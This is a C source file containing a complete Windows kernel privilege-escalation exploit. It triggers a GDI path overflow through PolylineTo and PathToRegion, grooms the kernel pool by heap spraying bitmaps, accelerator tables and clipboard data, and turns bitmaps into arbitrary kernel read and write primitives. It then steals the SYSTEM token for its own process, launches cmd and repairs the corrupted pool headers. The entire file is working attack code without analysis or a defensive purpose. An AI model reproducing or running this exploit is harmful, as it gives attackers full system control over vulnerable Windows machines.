#include<stdio.h>
#include<stdlib.h>
#include<windows.h>
#include<wingdi.h>
#include<math.h>
#include <Psapi.h>
#pragma comment(lib, "psapi.lib")

#define CPT 0x6666667
#define MAX_LIMIT 0x4E2000
#define SPRAY_NUM 0x1000
#define NUM 67
#define BTSIZE 0xE34
#define CLIPBOARD_SIZE 0xA30

static POINT pt[CPT];

HBITMAP g_hbits[SPRAY_NUM];
HACCEL g_hacl[SPRAY_NUM];
DWORD g_RawPvScan0 = 0;
DWORD g_RawDhSurf = 0;
DWORD g_Raw0x3A9 = 0;
DWORD g_Raw0x3AA = 0;
DWORD g_Raw0x3AD = 0;
DWORD g_Raw0x3B5 = 0;
DWORD g_Raw0x3B3 = 0;
DWORD g_Raw0x3B4 = 0;
DWORD g_Raw0x3B6 = 0;

HBITMAP g_hManager = NULL;
HBITMAP g_hWorker = NULL;

VOID
CreateClipboard(DWORD Size)
{
	PBYTE Buffer = (PBYTE)malloc(Size);
	FillMemory(Buffer, Size, 0x41);
	Buffer[Size - 1] = 0x00;
	HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, (SIZE_T)Size);
	CopyMemory(GlobalLock(hMem), Buffer, (SIZE_T)Size);
	GlobalUnlock(hMem);
	SetClipboardData(CF_TEXT, hMem);
}

VOID HeapSpray()
{
	ACCEL act[0xD] = { 0 };

	for (int i = 0; i < SPRAY_NUM; i++)
	{
		HBITMAP h = CreateBitmap(BTSIZE, 1, 1, 8, NULL);
		if (h == NULL)
		{
			printf("[-] Line = %d: Failed to spray.\n", __LINE__);
			return;
		}
		g_hbits[i] = h;
	}

	for (int i = 0; i < SPRAY_NUM; i++)
	{
		HACCEL h = CreateAcceleratorTableA(act, 0xD);
		if (h == NULL)
		{
			printf("[-] Line = %d: Failed to spray.\n", __LINE__);
			return;
		}
		g_hacl[i] = h;
	}

	for (int i = 0; i < SPRAY_NUM; i++)
	{
		DeleteObject(g_hbits[i]);
		g_hbits[i] = NULL;
	}

	for (int i = 0; i < SPRAY_NUM; i++)
		CreateClipboard(CLIPBOARD_SIZE - 0x14);

	for (int i = 0; i < SPRAY_NUM; i++)
	{
		HBITMAP h = CreateBitmap(1, ((0x1000 - 0x70 - 0x154 - CLIPBOARD_SIZE) - 8) / 4, 1, 0x20, NULL);
		if (h == NULL)
		{
			printf("[-] Line = %d: Failed to spray.\n", __LINE__);
			return;
		}
		g_hbits[i] = h;
	}

	for (int i = 0xA00; i < 0xD00; i++)
		DestroyAcceleratorTable(g_hacl[i]);
}

BOOL FindOutWorkerAndManager()
{
	PDWORD Buf = (PDWORD)malloc(0x1000 * sizeof(DWORD));
	for (int i = 0; i < SPRAY_NUM; i++)
	{
		DWORD dwSize = GetBitmapBits(g_hbits[i], 0x1000 * sizeof(DWORD), (LPVOID)Buf);

		if (dwSize == (0x1000 * sizeof(DWORD)))
		{
			g_hManager = g_hbits[i];
			g_Raw0x3A9 = Buf[0x3A9];
			g_Raw0x3AA = Buf[0x3AA];
			g_Raw0x3AD = Buf[0x3AD];
			g_Raw0x3B3 = Buf[0x3B3];
			g_Raw0x3B4 = Buf[0x3B4];
			g_Raw0x3B5 = Buf[0x3B5];
			g_Raw0x3B6 = Buf[0x3B6];
			g_RawPvScan0 = Buf[0x3B7];
			g_RawDhSurf = Buf[0x3AB];

			printf(
				"[+] g_Raw0x3A9 = %p\n"
				"[+] g_Raw0x3AA = %p\n"
				"[+] g_Raw0x3B3 = %p\n"
				"[+] g_Raw0x3B5 = %p\n"
				"[+] g_Raw0x3B6 = %p\n"
				"[+] g_RawPvScan0 = %p\n"
				"[+] g_RawDhSurf = %p\n",
				g_Raw0x3A9,
				g_Raw0x3AA,
				g_Raw0x3B3,
				g_Raw0x3B5,
				g_Raw0x3B6,
				g_RawPvScan0,
				g_RawDhSurf
			);

			DWORD Data[0x3B6] = { 0 };
			Data[0x3A9] = g_Raw0x3A9;
			Data[0x3AA] = g_Raw0x3AA;
			Data[0x3AB] = g_RawDhSurf;
			Data[0x3AD] = g_Raw0x3AD;
			Data[0x3B0] = g_RawDhSurf;
			Data[0x3B3] = g_Raw0x3B3;
			Data[0x3B4] = -1;
			Data[0x3B5] = g_Raw0x3B5;
			SetBitmapBits(g_hManager, sizeof(Data), Data);

			// 以同样的方法寻找hWorker
			for (int j = 0; j < SPRAY_NUM; j++)
			{
				dwSize = GetBitmapBits(g_hbits[j], 0x1000 * sizeof(DWORD), (LPVOID)Buf);
				if (g_hbits[j] != g_hManager && dwSize == (0x1000 * sizeof(DWORD)))
				{
					g_hWorker = g_hbits[j];
					break;
				}
			}
			free(Buf);
			return TRUE;
		}
	}
	free(Buf);
	return FALSE;
}

BOOL WriteMem(DWORD TargetAddress, DWORD Size, PDWORD Value)
{
	DWORD Data[0x3B8] = { 0 };
	Data[0x3B6] = g_Raw0x3B6;
	Data[0x3B7] = TargetAddress;
	Data[0x3A9] = g_Raw0x3A9;
	Data[0x3AA] = g_Raw0x3AA;
	Data[0x3AB] = g_RawDhSurf;
	Data[0x3AD] = g_Raw0x3AD;
	Data[0x3B0] = g_RawDhSurf;
	Data[0x3B3] = g_Raw0x3B3;
	Data[0x3B4] = g_Raw0x3B4;
	Data[0x3B5] = g_Raw0x3B5;
	SetBitmapBits(g_hManager, sizeof(Data), Data);
	return (SetBitmapBits(g_hWorker, Size, Value) == Size);
}

BOOL ReadDword(DWORD TargetAddress, PDWORD Value)
{
	DWORD Data[0x3B8] = { 0 };
	Data[0x3B6] = g_Raw0x3B6;
	Data[0x3B7] = TargetAddress;
	Data[0x3A9] = g_Raw0x3A9;
	Data[0x3AA] = g_Raw0x3AA;
	Data[0x3AB] = g_RawDhSurf;
	Data[0x3AD] = g_Raw0x3AD;
	Data[0x3B0] = g_RawDhSurf;
	Data[0x3B3] = g_Raw0x3B3;
	Data[0x3B4] = g_Raw0x3B4;
	Data[0x3B5] = g_Raw0x3B5;
	SetBitmapBits(g_hManager, sizeof(Data), Data);

	if (GetBitmapBits(g_hWorker, sizeof(DWORD), Value) == sizeof(DWORD))
	{
		return TRUE;
	}
	return FALSE;
}

DWORD GetEprocessInKernelSpace()
{
	PVOID DriverBase[1024] = { 0 };
	DWORD dwRetBytes = 0;
	CHAR DriveName[1024] = { 0 };
	HMODULE hKernel = 0;

	EnumDeviceDrivers(DriverBase, sizeof(DriverBase), &dwRetBytes);
	if (dwRetBytes < 0) {
		printf("[-]: Faild to GetKernelBase!\n");
		return 0;
	}
	for (int i = 0; i < dwRetBytes / sizeof(DriverBase[0]); i++) {
		if (!GetDeviceDriverBaseNameA(DriverBase[i], DriveName, 1023)) {
			printf("[-]: Faild to GetDeviceDriverBaseName!\n");
			return 0;
		}
		PCHAR str = strlwr(DriveName);
		if (str != NULL && (strcmp(str, "ntkrnlpa") == 0 || strstr(str, "ntkrnlpa"))) {
			hKernel = LoadLibraryA(DriveName);
			DWORD retVal = (DWORD)GetProcAddress(hKernel, "PsInitialSystemProcess") - (DWORD)hKernel + (DWORD)DriverBase[i];
			FreeLibrary(hKernel);
			return retVal;
		}
	}
}

VOID UpPrivilege()
{
	DWORD PsInitEproc = GetEprocessInKernelSpace();
	printf("[+] PsInitEprocess = %p\n", PsInitEproc);
	DWORD SysEprocess = 0;
	DWORD SysToken = 0;

	if (!ReadDword(PsInitEproc, &SysEprocess) || SysEprocess == 0)
	{
		printf("[-] Faild to ReadDword\n");
		return;
	}


	if (!ReadDword(SysEprocess + 0xF8, &SysToken) || SysToken == 0)
	{
		printf("[-] Faild to ReadDword\n");
		return;
	}
	printf("[+] SysToken = %p\n", SysToken);

	LIST_ENTRY listNextEprocEntry = { 0 };
	DWORD dwNextEprocAddr = 0;
	DWORD dwCurrPid = GetCurrentProcessId();
	DWORD dwPid = 0;
	//获取下一个EPROCESS
	if (!ReadDword(SysEprocess + 0xB8, (PDWORD)&listNextEprocEntry) || *(PDWORD)&listNextEprocEntry == NULL)
	{
		printf("[-] Faild to ReadDword\n");
		return;
	}

	do {
		dwNextEprocAddr = (DWORD)listNextEprocEntry.Flink - 0xB8;
		//读取当前EPROCESS下的pid
		if (!ReadDword(dwNextEprocAddr + 0xB4, &dwPid))
		{
			printf("[-] Faild to ReadDword\n");
			return;
		}
		//获取下一个EPROCESS
		if (!ReadDword(dwNextEprocAddr + 0xB8, (PDWORD)&listNextEprocEntry) || *(PDWORD)&listNextEprocEntry == NULL)
		{
			printf("[-] Faild to ReadDword\n");
			return;
		}

	} while (dwCurrPid != dwPid);

	DWORD dwCurTokenAddr = (DWORD)dwNextEprocAddr + 0xF8;
	//修改当前进程的TOKEN
	if (WriteMem(dwCurTokenAddr, sizeof(DWORD), &SysToken))
	{
		system("cmd");
	}
	else {
		printf("[-] Faild to WriteMem\n");
		return;
	}
}

// 恢复被破坏的池头部，防止蓝屏
VOID Recover()
{
	DWORD Data[10] = { 0x46ac0146,0x35316847,g_RawDhSurf - 1,0,0,0,0,g_RawDhSurf - 1,0,0 };
	WriteMem(g_RawPvScan0 - 0x115C, sizeof(Data), Data);
}

VOID Trigger()
{
	for (ULONG j = 0; j < CPT; j++)
	{
		pt[j].x = CPT + 1 - j;
		if (j < NUM)
			pt[j].y = j + 1;
		else
			pt[j].y = 0x100;

	}

	HDC hDc = GetDC(NULL);
	if (hDc == NULL)
	{
		printf("[-] Line = %d: Failed to call CreateDC.\n", __LINE__);
		return;
	}

	if (!BeginPath(hDc))
	{
		printf("[-] Line = %d: Failed.\n", __LINE__);
		return;
	}

	for (LONG i = CPT; i > 0; i -= min(MAX_LIMIT, i))
	{
		//!Polyline(hDc, &pt[CPT - i], min(MAX_LIMIT, i))
		if (!PolylineTo(hDc, &pt[CPT - i], min(MAX_LIMIT, i)))
		{
			printf("[-] Line = %d: Failed.\n", __LINE__);
			return;
		}
	}

	if (!EndPath(hDc))
	{
		printf("[-] Line = %d: Failed to define path.\n", __LINE__);
		return;
	}

	HeapSpray();

	HRGN hRgn = PathToRegion(hDc);

	if (hRgn == NULL)
	{
		printf("[-] Line = %d: Failed to trigger.\n", __LINE__);
		return;
	}
}

VOID Exploit()
{
	Trigger();
	if (!FindOutWorkerAndManager())
	{
		printf("[-] Line = %d: Failed.\n", __LINE__);
		return;
	}
	printf("[+] hManager: %p, hWorker: %p\n", g_hManager, g_hWorker);

	UpPrivilege();

	Recover();
}

int main(int argc, char** argv)
{
	Exploit();
	system("pause");
	return 0;
}
